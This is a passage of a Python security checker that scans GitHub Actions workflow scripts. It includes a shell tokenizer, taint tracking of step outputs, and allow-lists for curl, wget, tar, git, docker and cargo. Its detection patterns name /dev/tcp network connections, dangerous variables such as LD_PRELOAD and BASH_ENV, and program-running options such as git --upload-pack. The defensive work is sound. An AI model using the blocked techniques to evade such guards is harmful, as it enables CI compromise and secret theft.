FETCH_CONSUMERS = ("tar", "unzip", "mv", "cp", "chmod")
FETCH_VERIFIERS = ("sha256sum", "shasum")
# Round 7 (F5): a network connection opened by the shell itself, with no command to list.
DEV_NET_RE = re.compile(r"/dev/(?:tcp|udp)/")
EXEC_FD_RE = re.compile(r"\bexec\s+(?:[0-9]+|\{[A-Za-z_]\w*\})?<>")
# Round 7 (F3): a path in a bin directory (a downloaded file there would run under an allowed command name).
BIN_DIR_RE = re.compile(r"(?:^|[/=:~])(?:\.local/)?s?bin(?:/|$)")
# Round 7 (N3): the options of curl and wget a fetch step may use; every other option is refused.
CURL_SHORT_RE = re.compile(r"-(?:[fsSLv]+o?|o)")
CURL_LONG_FLAGS = frozenset(("--fail", "--silent", "--show-error", "--location", "--fail-with-body", "--create-dirs", "--verbose"))
CURL_LONG_VALUE = frozenset(("--output", "--retry", "--retry-delay", "--retry-max-time", "--connect-timeout", "--max-time", "--proto"))
WGET_SHORT_FLAGS = frozenset(("-q", "-v", "-nv", "-c", "-nc", "-N"))
WGET_SHORT_VALUE_RE = re.compile(r"-[qvcN]*[OtTP]")
WGET_SHORT_ATTACHED_RE = re.compile(r"-[qvcN]*O(.+)")
WGET_LONG_FLAGS = frozenset(("--quiet", "--no-verbose", "--continue", "--no-clobber", "--https-only", "--retry-connrefused"))
WGET_LONG_VALUE = frozenset(("--output-document", "--tries", "--timeout", "--directory-prefix", "--max-redirect"))
DANGEROUS_ASSIGN_RE = re.compile(r"LD_\w*|DYLD_\w*|BASH_ENV|ENV|PATH|IFS|PS4|CDPATH|SHELLOPTS|PYTHONPATH|PYTHONSTARTUP|"
                                 r"NODE_OPTIONS|PERL5OPT|PERL5LIB|RUBYOPT|RUBYLIB|GIT_\w*|CURL_\w*|WGETRC|TAR_OPTIONS|SSL_CERT_\w+|"
                                 r"(?i:https?_proxy|all_proxy|no_proxy)")
TAR_FLAGS_RE = re.compile(r"-?[xzfvCjJtpmkO]+")  # no -I / --use-compress-program / --to-command / --checkpoint-action
TAR_LONG_RE = re.compile(r"--(?:strip-components=[0-9]+|no-same-owner|no-same-permissions)")
RUNS_ON_MATRIX_RE = re.compile(r"\$\{\{\s*matrix\.os\s*\}\}")
# Round 6 (security 5): triggers no guarded workflow may have, and the canonical JSON of each `on:` block.
ON_FORBIDDEN = ("workflow_call", "pull_request_target", "repository_dispatch")
ON_PINS: Dict[str, str] = {
    'release.yml':
        '{"workflow_dispatch":{"inputs":{"dry_run":{"default":"true","type":"boolean"},"tag":{"required":"true"}}}}',
    'c8-precheck.yml':
        '{"merge_group":{"types":"checks_requested"},"pull_request":{"branches":"main, develop, \\"release/**\\", \\"rehearsal/**\\", \\"chain/**\\""},"push":{"branches":"main, develop, \\"release/**\\""}}',
    'publish-ci-image.yml':
        '{"push":{"branches":"\\"release/**\\"","paths":[".github/Dockerfile.ci",".github/workflows/publish-ci-image.yml","deploy/docker-1461/provision/lib.sh"]},"workflow_dispatch":null}',
}


class RunCtx:
    """What a `run:` text may name: the matrix keys of its job and the ids of its same-job steps that are safe
    (a `run:` step; Round 8, S3, vote 6def5ab6 option B: never a `uses:` step) and not tainted. Round 7 adds the shell the steps run
    under, whether the job runs on Windows, the image tags an earlier step built locally and the names a fetch step
    wrote (a later step that names one must verify it)."""

    def __init__(self, matrix: Iterable[str] = (), safe: Iterable[str] = (), tainted: Iterable[str] = (),
                 default_shell: str = "", windows: bool = False, local_images: Iterable[str] = (),
                 uses_ids: Iterable[str] = (), matrix_values: Optional[Dict[str, List[str]]] = None) -> None:
        self.matrix = frozenset(matrix)
        self.safe = frozenset(safe)
        self.tainted = frozenset(tainted)
        self.default_shell = default_shell
        self.windows = windows
        self.local_images = frozenset(local_images)
        self.uses_ids = frozenset(uses_ids)  # Round 8 (S3): ids of `uses:` steps, whose outputs run text never names
        self.matrix_values: Dict[str, List[str]] = dict(matrix_values or {})  # Round 8 (S4): literal values per key
        self.fetched: set = set()


def expr_allowed(expr: str, ctx: RunCtx) -> bool:
    """True only for a bare property path rooted at matrix.<key>, secrets.<NAME> or steps.<id>.outputs.<name>."""
    path = expr.strip()
    if not EXPR_PATH_RE.fullmatch(path):
        return False
    parts = path.split(".")
    if parts[0] == "matrix":
        return len(parts) == 2 and parts[1] in ctx.matrix
    if parts[0] == "secrets":
        return len(parts) == 2
    if parts[0] == "steps":
        return len(parts) == 4 and parts[2] == "outputs" and parts[1] in ctx.safe and parts[1] not in ctx.tainted
    return False


def run_text(run: Node) -> Optional[str]:
    if run.kind == "block" and isinstance(run.value, list):
        return "\n".join(run.value)
    return run.text() if run.kind == "scalar" else None


def node_texts(node: Node) -> List[str]:
    """The text of every scalar and block scalar at or under ``node``."""
    texts: List[str] = []
    for _path, sub in walk(node):
        if sub.kind == "scalar":
            texts.append(sub.text())
        elif sub.kind == "block" and isinstance(sub.value, list):
            texts.append("\n".join(sub.value))
    return texts


def node_exprs(node: Node) -> List[str]:
    return [m.group(1) for t in node_texts(node) for m in EXPR_RE.finditer(t)]


def step_exprs(step: Node) -> List[str]:
    """Every `${{ }}` body in a step's run text, env values and (Round 7, F1) `with:` values."""
    texts: List[str] = []
    run = step.get("run")
    body = run_text(run) if run is not None else None
    if body is not None:
        texts.append(body)
    for key in ("env", "with"):
        sub = step.get(key)
        if sub is not None:
            texts.extend(node_texts(sub))
    return [m.group(1) for t in texts for m in EXPR_RE.finditer(t)]


def written_files(body: str) -> List[str]:
    """Round 7 (N5, F1): the redirect targets of a script other than GITHUB_OUTPUT and the std streams."""
    try:
        targets = ShellScan(EXPR_RE.sub("$__GHX__", body)).targets
    except ShellError:
        return ["\0unreadable"]
    return [t for t in targets if t and not t.isdigit() and t != "-" and "GITHUB_OUTPUT" not in t and not t.startswith("/dev/")]


def local_image_tags(nodes: List[Node]) -> List[str]:
    """Tags a sha-pinned docker/build-push-action step loads into the local daemon (`load: true`)."""
    tags: List[str] = []
    for step in nodes:
        uses = step.get("uses") if step.kind == "map" else None
        if uses is None or uses.kind != "scalar":  # an unpinned use is refused on its own, so its tags are listed too
            continue
        if not uses.text().strip().lower().startswith("docker/build-push-action@"):
            continue
        with_ = step.get("with")
        load, tag = (with_.get("load"), with_.get("tags")) if with_ is not None else (None, None)
        if load is None or load.text().strip() != "true" or tag is None:
            continue
        for text in node_texts(tag):
            tags.extend(t.strip() for t in re.split(r"[\s,]+", text) if t.strip())
    return tags


def run_context(steps: Optional[Node], matrix: Iterable[str], envs: Iterable[Optional[Node]] = (),
                default_shell: str = "", windows: bool = False,
                matrix_values: Optional[Dict[str, List[str]]] = None) -> RunCtx:
    """The safe and tainted step ids of one job (or composite action). A step that writes `$GITHUB_OUTPUT` (or a
    legacy `::set-output`) while it references a root outside the allow-list (in its env or text) is tainted, and so
    are the steps that read it. Round 7 (N5, F1): a job or workflow `env` with a root outside the allow-list taints
    every writer of the job; a `uses:` step with such a root in its `with:` or `env:` has tainted outputs; and a
    writer that follows a step with such a root which wrote GITHUB_ENV / GITHUB_PATH, or a file the writer names, is
    tainted (a value relayed through the environment or a file)."""
    nodes = steps.value if steps is not None and steps.kind == "seq" and isinstance(steps.value, list) else []
    images = local_image_tags(nodes)
    base = RunCtx(matrix)
    env_dirty = any(not expr_allowed(e, base) for env in envs if env is not None for e in node_exprs(env))
    safe: set = set()
    uses_ids: set = set()
    recs: List[Tuple[str, Node, str, bool]] = []
    for step in nodes:
        if step.kind != "map":
            continue
        ident = step.get("id")
        sid = ident.text().strip() if ident is not None and ident.kind == "scalar" else ""
        run, uses = step.get("run"), step.get("uses")
        body = (run_text(run) or "") if run is not None else ""
        writer = False
        if run is not None:
            writer = "GITHUB_OUTPUT" in body or "set-output" in body
            if sid:
                safe.add(sid)
        elif uses is not None:
            if sid:
                uses_ids.add(sid)  # Round 8 (S3): an output of a `uses:` step is never safe in run text
            writer = uses.kind == "scalar" and SHA_USES_RE.fullmatch(uses.text().strip()) is not None
        recs.append((sid, step, body, writer))
    tainted: set = set()
    changed = True
    while changed:
        changed = False
        ctx = RunCtx(matrix, safe, tainted)
        relay, names = False, set()
        for sid, step, body, writer in recs:
            dirty = bool(TAINT_ENV_RE.search(body)) or not all(expr_allowed(e, ctx) for e in step_exprs(step))
            if writer and sid and sid not in tainted and (
                    env_dirty or dirty or relay or "\0unreadable" in names or any(n in body for n in names)):
                tainted.add(sid)
                changed = True
            if dirty and body:
                relay = relay or FETCH_FILE_RE.search(body) is not None
                names.update(written_files(body))
    return RunCtx(matrix, safe, tainted, default_shell, windows, images, uses_ids, matrix_values)


def matrix_keys(job: Node) -> List[str]:
    """The keys a `matrix.<key>` expression may name: the axes and the keys of the include entries."""
    st = job.get("strategy")
    matrix = st.get("matrix") if st is not None else None
    keys: List[str] = []
    if matrix is None or matrix.kind != "map" or not isinstance(matrix.value, dict):
        return keys
    for key, val in matrix.value.items():
        if key == "include":
            for entry in val.value if val.kind == "seq" and isinstance(val.value, list) else []:
                keys.extend(entry.keys())
        elif key != "exclude":
            keys.append(key)
    return keys


def flow_items(text: str) -> List[str]:
    """The items of a flow list `[a, 'b, c', "d"]` (a plain scalar is its own single item)."""
    text = text.strip()
    if not (text.startswith("[") and text.endswith("]")):
        return [text.strip("'\"")] if text else []
    items: List[str] = []
    cur, quote = "", ""
    for ch in text[1:-1] + ",":
        if quote:
            if ch == quote:
                quote = ""
            else:
                cur += ch
        elif ch in "'\"":
            quote = ch
        elif ch == ",":
            if cur.strip():
                items.append(cur.strip())
            cur = ""
        else:
            cur += ch
    return items


def matrix_literals(job: Node) -> Dict[str, List[str]]:
    """Round 8 (S4): every literal value of each matrix key (axis lists, flow lists, include entries)."""
    st = job.get("strategy")
    matrix = st.get("matrix") if st is not None and st.kind == "map" else None
    out: Dict[str, List[str]] = {}
    if matrix is None or matrix.kind != "map" or not isinstance(matrix.value, dict):
        return out

    def values(node: Node) -> List[str]:
        if node.kind == "seq" and isinstance(node.value, list):
            return [t for n in node.value if n.kind == "scalar" for t in flow_items(n.text())]
        return flow_items(node.text()) if node.kind == "scalar" else []

    for key, val in matrix.value.items():
        if key == "include":
            for entry in val.value if val.kind == "seq" and isinstance(val.value, list) else []:
                if entry.kind == "map" and isinstance(entry.value, dict):
                    for ekey, eval_ in entry.value.items():
                        out.setdefault(ekey, []).extend(values(eval_))
        elif key != "exclude":
            out.setdefault(key, []).extend(values(val))
    return out


def matrix_os_values(job: Node) -> List[str]:
    """Every `os` of a job's matrix (an axis list, a flow list or include entries)."""
    st = job.get("strategy")
    matrix = st.get("matrix") if st is not None else None
    if matrix is None or matrix.kind != "map":
        return []
    out: List[str] = []
    axis = matrix.get("os")
    if axis is not None and axis.kind == "seq" and isinstance(axis.value, list):
        out.extend(n.text().strip() for n in axis.value)
    elif axis is not None and axis.kind == "scalar":
        text = axis.text().strip()
        inner = text[1:-1] if text.startswith("[") and text.endswith("]") else text
        out.extend(p.strip().strip("'\"") for p in inner.split(","))
    include = matrix.get("include")
    for entry in include.value if include is not None and include.kind == "seq" and isinstance(include.value, list) else []:
        val = entry.get("os")
        out.append(val.text().strip() if val is not None and val.kind == "scalar" else "")
    return out


# ------------------------------------------------------- shell scanner --
SHELL_CMD_KW = frozenset(("if", "then", "elif", "else", "while", "until", "do", "!", "{", "time"))
SHELL_END_KW = frozenset(("fi", "done", "esac", "}"))
SHELL_NOOP = frozenset(("set", "exit", ":", "true", "false", "break", "continue", "return"))
SHELL_ASSIGN_RE = re.compile(r"([A-Za-z_][A-Za-z0-9_]*)\+?=")


class ShellError(Exception):
    """The script text is outside what the scanner understands (a step that fetches then fails closed)."""


class ShellLevel:
    """The parse state of one command list (the top level, a `$(...)`, a backtick or a `<(...)`)."""

    def __init__(self) -> None:
        self.cmd_pos = True
        self.expect = ""
        self.wordlist = False
        self.skip = False
        self.paren = 0
        self.cases: List[str] = []
        self.cur: Optional[List[Tuple[str, bool]]] = None
        self.prev = "\n"  # the separator before the next command (Round 7, F3)
        self.neg = False  # a command that follows `if`, `elif`, `while`, `until` or `!` is a condition
        self.stack: List[str] = []  # open if / while / until / for / case / `{` constructs
        self.last: Optional[int] = None  # index into ShellScan.info of the command the next separator ends
        self.fn_next = False  # a function definition was just read, so the next `{` opens its body
        self.dbl = False  # inside `[[ ... ]]`, where `(`, `)`, `&&` and `||` are operators of the test, not of the shell

    def close(self) -> None:
        if self.stack:
            self.stack.pop()


class ShellScan:
    """Round 6: the command words of a shell script, comments and here-document bodies excluded. ``cmds`` holds
    (word, literal, args) per command; a word is literal only when it has no quote, escape or expansion. ``words``
    is the decoded text of every word, ``assigns`` the names assigned in command position."""

    def __init__(self, text: str) -> None:
        self.s = text.replace("\\\n", "")
        self.n = len(self.s)
        self.i = 0
        self.cmds: List[Tuple[str, bool, List[Tuple[str, bool]]]] = []
        self.words: List[str] = []
        self.assigns: List[str] = []
        self.heredocs = 0
        self.pending: List[Tuple[str, bool]] = []
        # Round 7 (F3): per command, aligned with ``cmds``: the separators around it and whether it runs unconditionally
        # at the top level; ``targets`` holds the redirect targets (and here-string words).
        self.info: List[Dict[str, object]] = []
        self.targets: List[str] = []
        self.funcs: set = set()  # Round 8 (S8): the names `name()` defines in the script
        self.nest = 0
        self.scan(None)

    def word(self, text: str, lit: bool, lv: ShellLevel) -> None:
        self.words.append(text)
        if lv.skip:
            lv.skip = False
            self.targets.append(text)
            return
        if lv.cases and lv.cases[-1] == "pat":
            if lit and text == "esac":
                lv.cases.pop()
                lv.close()
                lv.cmd_pos = False
            return
        ex, lv.expect = lv.expect, ""
        if ex == "for_var":
            lv.expect = "for_in"
            return
        if ex == "for_in" and lit and text == "in":
            lv.wordlist = True
            return
        if ex == "case_subj":
            lv.expect = "case_in"
            return
        if ex == "case_in" and lit and text == "in":
            lv.cases.append("pat")
            lv.stack.append("case")
            return
        if lv.wordlist:
            return
        if not lv.cmd_pos:
            if lv.cur is not None:
                lv.cur.append((text, lit))
            if lv.dbl and lit and text == "]]":
                lv.dbl = False
            return
        m = SHELL_ASSIGN_RE.match(text)
        if m is not None:
            self.assigns.append(m.group(1))
            return
        if lit and text in SHELL_CMD_KW:
            if text in ("if", "elif", "while", "until", "!"):
                lv.neg = True
            if text in ("if", "while", "until", "{"):
                lv.stack.append("fn" if text == "{" and lv.fn_next else text)  # Round 8 (C2): a function body is not top level
                lv.fn_next = False
            return
        if lit and text in ("for", "select"):
            lv.expect, lv.cmd_pos = "for_var", False
            lv.stack.append("for")
            return
        if lit and text == "case":
            lv.expect, lv.cmd_pos = "case_subj", False
            return
        if lit and text == "esac" and lv.cases:
            lv.cases.pop()
            lv.close()
            lv.cmd_pos = False
            return
        if lit and (text in SHELL_END_KW or text in SHELL_NOOP):
            if text in SHELL_END_KW:
                lv.close()
            lv.cmd_pos = False
            return
        lv.cur = []
        top = self.nest == 0 and lv.paren == 0 and not any(k in ("if", "while", "until", "case", "fn") for k in lv.stack)
        self.info.append({"prev": lv.prev, "nxt": "", "neg": lv.neg, "top": top, "sub": self.nest > 0})
        lv.last, lv.neg = len(self.info) - 1, False
        self.cmds.append((text, lit, lv.cur))
        lv.cmd_pos = False
        lv.dbl = lit and text == "[["

    def separator(self, lv: ShellLevel, op: str) -> None:
        lv.dbl = False
        lv.cmd_pos, lv.wordlist, lv.skip, lv.expect, lv.cur = True, False, False, "", None
        if lv.last is not None:
            self.info[lv.last]["nxt"] = op
            lv.last = None
        lv.prev = op
        if op == ";;" and lv.cases:
            lv.cases[-1] = "pat"

    def newline(self, lv: ShellLevel) -> None:
        self.separator(lv, "\n")
        while self.pending:
            delim, strip = self.pending.pop(0)
            body: List[str] = []
            while True:
                if self.i >= self.n:
                    raise ShellError("here-document not terminated")
                j = self.s.find("\n", self.i)
                line = self.s[self.i:self.n if j < 0 else j]
                self.i = self.n if j < 0 else j + 1
                if (line.lstrip("\t") if strip else line) == delim:
                    break
                body.append(line)
            self.words.append("\n".join(body))

    def operator(self, lv: ShellLevel) -> None:
        two = self.s[self.i:self.i + 2]
        if two == "&>":
            self.i += 1
            self.redirect(lv)
        elif two in ("&&", "||", ";;", ";&", "|&"):
            self.i += 2
            self.separator(lv, two)
        else:
            self.i += 1
            self.separator(lv, two[0])

    def heredoc_delim(self) -> str:
        while self.i < self.n and self.s[self.i] in " \t":
            self.i += 1
        out: List[str] = []
        while self.i < self.n and self.s[self.i] not in " \t\n;&|()<>":
            if self.s[self.i] not in "'\"\\":
                out.append(self.s[self.i])
            self.i += 1
        if not out:
            raise ShellError("here-document without a delimiter")
        return "".join(out)

    def redirect(self, lv: ShellLevel) -> None:
        s, i = self.s, self.i
        if s[i:i + 3] == "<<<":
            self.i += 3
            lv.skip = True
        elif s[i:i + 2] == "<<":
            self.i += 2
            strip = s[self.i:self.i + 1] == "-"
            self.i += 1 if strip else 0
            self.pending.append((self.heredoc_delim(), strip))
            self.heredocs += 1
        elif s[i:i + 2] in ("<(", ">("):
            self.i += 2
            self.scan(")")
            lv.skip = False
        else:
            self.i += 1
            if s[self.i:self.i + 1] in (">", "|", "&", "<") if s[i] == ">" else s[self.i:self.i + 1] in ("&", ">"):
                self.i += 1
            lv.skip = True

    def braced(self, j: int) -> int:
        """The index after the `}` that closes a `${` whose body starts at ``j``."""
        s, depth = self.s, 1
        while j < self.n:
            c = s[j]
            if c == "\\":
                j += 1
            elif c in "'\"":
                j = s.find(c, j + 1)
                if j < 0:
                    raise ShellError("unterminated quote in `${...}`")
            elif c == "`" or s[j:j + 2] == "$(":
                raise ShellError("command substitution inside `${...}`")
            elif c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    return j + 1
            j += 1
        raise ShellError("unterminated `${`")

    def arithmetic(self, j: int) -> bool:
        """True when the `$((` whose body starts at ``j`` closes with an adjacent `))`; otherwise bash reads it as the
        command substitution `$( (...) ...)` and so does the scanner."""
        s, depth = self.s, 2
        while j < self.n:
            if s[j] == "(":
                depth += 1
            elif s[j] == ")":
                if depth == 2 and s[j + 1:j + 2] != ")":
                    return False
                depth -= 1
                if depth == 0:
                    return True
            j += 1
        raise ShellError("unterminated `$((`")

    def walk_arithmetic(self, i: int) -> str:
        """Round 7 (N1): the body of `$(( ))` is walked, so a `$( )`, a backtick or a `${ }` inside it is scanned."""
        s, j, depth = self.s, i + 3, 2
        while j < self.n and depth:
            c = s[j]
            if s[j:j + 2] == "$(" and s[j:j + 3] != "$((":
                self.i = j + 2
                self.scan(")")
                j = self.i
                continue
            if s[j:j + 2] == "${":
                j = self.braced(j + 2)
                continue
            if c == "`":
                self.i = j + 1
                self.scan("`")
                j = self.i
                continue
            if c == '"':
                self.i = j + 1
                self.dquote()
                j = self.i
                continue
            if c == "'":
                j = s.find("'", j + 1)
                if j < 0:
                    raise ShellError("unterminated quote in `$(( ))`")
            depth += 1 if c == "(" else -1 if c == ")" else 0
            j += 1
        if depth:
            raise ShellError("unterminated `$((`")
        self.i = j
        return "$(())"

    def dollar(self) -> str:
        s, i = self.s, self.i
        nxt = s[i + 1:i + 2]
        if s[i + 1:i + 3] == "((" and self.arithmetic(i + 3):
            return self.walk_arithmetic(i)
        if nxt == "(":
            self.i += 2
            self.scan(")")
            return "$()"
        if nxt == "{":
            self.i = self.braced(i + 2)
            return s[i:self.i]
        if nxt.isalpha() or nxt == "_":
            j = i + 1
            while j < self.n and (s[j].isalnum() or s[j] == "_"):
                j += 1
            self.i = j
            return s[i:j]
        if nxt and (nxt.isdigit() or nxt in "#?@*!$-"):
            self.i += 2
            return s[i:i + 2]
        self.i += 1
        return "$"

    def dquote(self) -> str:
        s, out = self.s, []
        while self.i < self.n:
            c = s[self.i]
            if c == '"':
                self.i += 1
                return "".join(out)
            if c == "\\" and self.i + 1 < self.n:
                out.append(s[self.i + 1])
                self.i += 2
            elif c == "$":
                out.append(self.dollar())
            elif c == "`":
                self.i += 1
                self.scan("`")
                out.append("`")
            else:
                out.append(c)
                self.i += 1
        raise ShellError("unterminated double quote")

    def array_literal(self) -> bool:
        """Round 8: the body of `NAME=( ... )` (the scanner is just past the `(`) is data when it holds no command
        substitution or backtick; the cursor moves past the closing `)`. False leaves the cursor in place."""
        j, quote = self.i, ""
        while j < self.n:
            ch = self.s[j]
            if quote:
                if ch == quote:
                    quote = ""
                elif ch == "\\" and quote == '"':
                    j += 1
            elif ch in "'\"":
                quote = ch
            elif ch == "\\":
                j += 1
            elif ch == "`" or self.s.startswith("$(", j):
                return False
            elif ch == ")":
                self.i = j + 1
                return True
            j += 1
        return False

    def scan(self, closer: Optional[str]) -> None:
        if closer is None:
            self.walk(None)
            return
        self.nest += 1
        self.walk(closer)
        self.nest -= 1

    def walk(self, closer: Optional[str]) -> None:
        s, lv = self.s, ShellLevel()
        buf: List[str] = []
        lit, have = True, False

        def end_word() -> None:
            nonlocal buf, lit, have
            if have:
                self.word("".join(buf), lit, lv)
            buf, lit, have = [], True, False

        while True:
            if self.i >= self.n:
                end_word()
                if closer is not None:
                    raise ShellError("unterminated command substitution")
                if self.pending:
                    raise ShellError("here-document body missing")
                return
            c = s[self.i]
            if c == "\\":
                if self.i + 1 >= self.n:
                    raise ShellError("trailing backslash")
                buf.append(s[self.i + 1])
                lit, have = False, True
                self.i += 2
            elif c == "'":
                j = s.find("'", self.i + 1)
                if j < 0:
                    raise ShellError("unterminated single quote")
                buf.append(s[self.i + 1:j])
                lit, have = False, True
                self.i = j + 1
            elif c == '"':
                self.i += 1
                buf.append(self.dquote())
                lit, have = False, True
            elif c == "$":
                buf.append(self.dollar())
                lit, have = False, True
            elif c == "`":
                self.i += 1
                if closer == "`":
                    end_word()
                    return
                self.scan("`")
                buf.append("`")
                lit, have = False, True
            elif c == "#" and not have:
                j = s.find("\n", self.i)
                self.i = self.n if j < 0 else j
            elif c in " \t":
                end_word()
                self.i += 1
            elif c == "\n":
                end_word()
                self.i += 1
                self.newline(lv)
            elif c in "&|" and lv.dbl and s.startswith(("&&", "||"), self.i):
                end_word()
                self.word(s[self.i:self.i + 2], True, lv)
                self.i += 2
            elif c in "()" and lv.dbl:  # a group or an extended-regex paren of the test
                buf.append(c)
                lit, have = False, True
                self.i += 1
            elif c in ";&|":
                end_word()
                self.operator(lv)
            elif c == "(":
                end_word()
                self.i += 1
                if lv.cases and lv.cases[-1] == "pat":
                    continue
                if s[self.i - 2:self.i - 1] == "=" and self.array_literal():
                    continue
                if not lv.cmd_pos:
                    name = self.cmds[-1] if self.cmds else None
                    if (name is not None and lv.cur is name[2] and not lv.cur and name[1] and lv.last is not None
                            and re.fullmatch(r"\w+", name[0]) and re.match(r"[ \t]*\)", s[self.i:])):
                        # `name()` opens a function definition: the name is not a command, its body is scanned in place
                        self.funcs.add(self.cmds.pop()[0])
                        self.info.pop()
                        self.i += re.match(r"[ \t]*\)", s[self.i:]).end()  # type: ignore[union-attr]
                        lv.last, lv.cur, lv.cmd_pos, lv.fn_next = None, None, True, True
                        continue
                    raise ShellError("unexpected `(`")
                lv.paren += 1
            elif c == ")":
                end_word()
                self.i += 1
                if lv.cases and lv.cases[-1] == "pat":
                    lv.cases[-1], lv.cmd_pos = "body", True
                elif lv.paren > 0:
                    lv.paren -= 1
                    lv.cmd_pos = False
                elif closer == ")":
                    return
                else:
                    raise ShellError("unbalanced `)`")
            elif c in "<>":
                if have and lit and "".join(buf).isdigit():
                    buf, lit, have = [], True, False
                else:
                    end_word()
                self.redirect(lv)
            else:
                buf.append(c)
                have = True
                self.i += 1


def norm_name(text: str) -> str:
    """A fetched or named file with `${VAR}` folded to `$VAR`, so the two spellings of one variable compare equal."""
    return re.sub(r"\$\{(\w+)\}", r"$\1", text)


def is_verify(word: str, args: List[Tuple[str, bool]]) -> bool:
    """sha256sum or shasum in check mode (`-c`, `--check` or a short cluster holding `c`)."""
    if word not in FETCH_VERIFIERS:
        return False
    return any(a == "--check" or (a.startswith("-") and not a.startswith("--") and "c" in a[1:]) for a, _l in args)


def option_problem(word: str, args: List[Tuple[str, bool]], outputs: List[str]) -> str:
    """Round 7 (N3): "" when every option of one curl or wget call is on its allow-list, else the first one that is
    not (wget `-e` / `--use-askpass`, curl `-K` and `--config` run or read what the step did not list). The names the
    call writes are appended to ``outputs``."""
    curl = word == "curl"
    urls: List[str] = []
    named = False
    n = 0
    while n < len(args):
        arg = args[n][0]
        n += 1
        if not arg.startswith("-") or arg == "-":
            if "/" not in arg and ":" not in arg:
                return f"the {word} argument `{arg[:40]}` (neither an allowed option nor a URL)"
            urls.append(arg)
            continue
        value: Optional[str] = None
        want = False
        if arg.startswith("--"):
            name, eq, val = arg.partition("=")
            flags, valued = (CURL_LONG_FLAGS, CURL_LONG_VALUE) if curl else (WGET_LONG_FLAGS, WGET_LONG_VALUE)
            if name in flags and not eq:
                continue
            if name not in valued:
                return f"the {word} option `{arg[:40]}`"
            want, value = True, (val if eq else None)
            out_opt = name in ("--output", "--output-document")
        elif curl:
            if CURL_SHORT_RE.fullmatch(arg) is None:
                return f"the curl option `{arg[:40]}`"
            want, out_opt = arg.endswith("o"), arg.endswith("o")
        else:
            attached = WGET_SHORT_ATTACHED_RE.fullmatch(arg)
            if arg in WGET_SHORT_FLAGS:
                continue
            if attached is not None:
                outputs.append(attached.group(1))
                named = True
                continue
            if WGET_SHORT_VALUE_RE.fullmatch(arg) is None:
                return f"the wget option `{arg[:40]}`"
            want, out_opt = True, arg.endswith("O")
        if want and value is None:
            if n >= len(args):
                return f"the {word} option `{arg[:40]}` with no value"
            value = args[n][0]
            n += 1
        if out_opt and value is not None:
            outputs.append(value)
            named = True
    if not curl and not named:  # Round 8 (S2): wget writes the last component of each URL (index.html for a directory URL)
        outputs.extend(re.split(r"[?#]", u)[0].rstrip("/").rsplit("/", 1)[-1] if not u.endswith("/") else "index.html"
                       for u in urls)
    return ""


def docker_image(toks: List[str]) -> str:
    """The image of `docker run|create|pull <toks>`: the first token that is not an option or an option's value."""
    n = 0
    while n < len(toks):
        tok = toks[n]
        n += 1
        if tok.startswith("-"):
            if "=" not in tok and tok in DOCKER_VALUE_OPTS:
                n += 1
            continue
        return tok
    return ""


def base_of(name: str) -> str:
    """The last path component of a named file, with `${VAR}` folded to `$VAR`."""
    return norm_name(name).rsplit("/", 1)[-1]


def tool_url_problem(word: str, texts: List[str]) -> str:
    """Round 8 (S8): a tool that can fetch from a URL it is given is refused when an argument is one."""
    if word in RUN_URL_TOOLS and any(URL_RE.match(a) or re.search(r"=[A-Za-z][A-Za-z0-9+.-]*://", a)
                                     or (word == "git" and re.match(r"[\w.-]+@[\w.-]+:", a)) for a in texts):
        return f"`{word}` with a URL argument"
    return ""


def script_problem(word: str, args: List[Tuple[str, bool]]) -> str:
    """Round 8 (S8): bash, sh, source and python3 run a literal script file of the repository and nothing else:
    `-c`, `-m`, a here-document or stdin, a computed or absolute path and `..` are refused."""
    flags = RUN_PY_FLAGS_RE if word == "python3" else RUN_SH_FLAGS_RE
    n = 0
    while word != "source" and n < len(args) and flags.fullmatch(args[n][0]):
        n += 1
    if n >= len(args) or not args[n][1]:
        return f"`{word}` without a literal script file (`-c`, `-m`, stdin and a here-document are refused)"
    path = args[n][0]
    ok = RUN_PY_RE.fullmatch(path) if word == "python3" else RUN_SCRIPT_RE.fullmatch(path)
    if not ok or ".." in path:
        return f"`{word} {path[:40]}`, which is not a script file of the repository"
    return ""


def git_problem(texts: List[str]) -> str:
    if not texts or texts[0].startswith("-"):
        return "`git` with a global option or no subcommand"
    if texts[0] not in RUN_GIT:
        return f"`git {texts[0][:30]}`, which is not in RUN_GIT"
    if any(a.split("=")[0] in ("--upload-pack", "--receive-pack", "--exec") for a in texts):
        return "`git` with an option that runs a program"
    if texts[0] == "config":
        keys = [a for a in texts[1:] if not a.startswith("-")]
        if keys[:1] not in (["user.name"], ["user.email"]):
            return "`git config` of a key other than user.name and user.email"
    return ""


def cargo_problem(texts: List[str]) -> str:
    plain = [a for a in texts if not a.startswith("-") and not a.startswith("+")]
    if any(a == "--config" or a.startswith("--config=") for a in texts):
        return "`cargo --config` (it can name a program to run)"
    if not plain or plain[0] not in RUN_CARGO:
        return f"`cargo {(plain or [''])[0][:30]}`, which is not in RUN_CARGO"
    if plain[0] != "install":
        return ""
    crates, locked, version, n, rest = [], False, False, 0, texts[texts.index("install") + 1:]
    while n < len(rest):
        arg = rest[n]
        n += 1
        if arg == "--locked":
            locked = True
        elif arg == "--version" and n < len(rest) and re.fullmatch(r"[0-9]+\.[0-9]+\.[0-9]+", rest[n]):
            version, n = True, n + 1
        elif arg.startswith("-") or arg not in RUN_CARGO_CRATES:
            return f"`cargo install {arg[:40]}` (only --locked --version of {', '.join(RUN_CARGO_CRATES)})"
        else:
            crates.append(arg)
    if not (crates and locked and version):
        return "`cargo install` without a listed crate, --locked and a pinned --version"
    return ""


def docker_problem(texts: List[str], ctx: Optional[RunCtx]) -> str:
    if not texts or texts[0].startswith("-"):
        return "`docker` with a global option or no subcommand"
    sub = texts[0]
    if sub in ("run", "create", "pull"):
        n = 1
        while n < len(texts) and texts[n].startswith("-"):  # the options end at the image
            tok = texts[n]
            n += 1
            if "=" not in tok and tok in DOCKER_VALUE_OPTS:
                n += 1
            elif tok.split("=")[0] not in DOCKER_VALUE_OPTS and tok not in DOCKER_FLAG_OPTS:
                return f"`docker {sub}` with the option `{tok[:30]}`, which the guard cannot place before the image"
        image = docker_image(texts[1:])
        local = ctx.local_images if ctx is not None else frozenset()
        if not (IMAGE_DIGEST_RE.fullmatch(image) or image in local):
            return f"`docker {sub}` of the image `{image[:50]}`, which is neither pinned by digest nor built by an earlier step"
        return ""
    if sub not in RUN_DOCKER:
        return f"`docker {sub[:30]}`, which is not in RUN_DOCKER"
    return ""


def wrapper_problem(word: str, args: List[Tuple[str, bool]], ctx: Optional[RunCtx], depth: int) -> str:
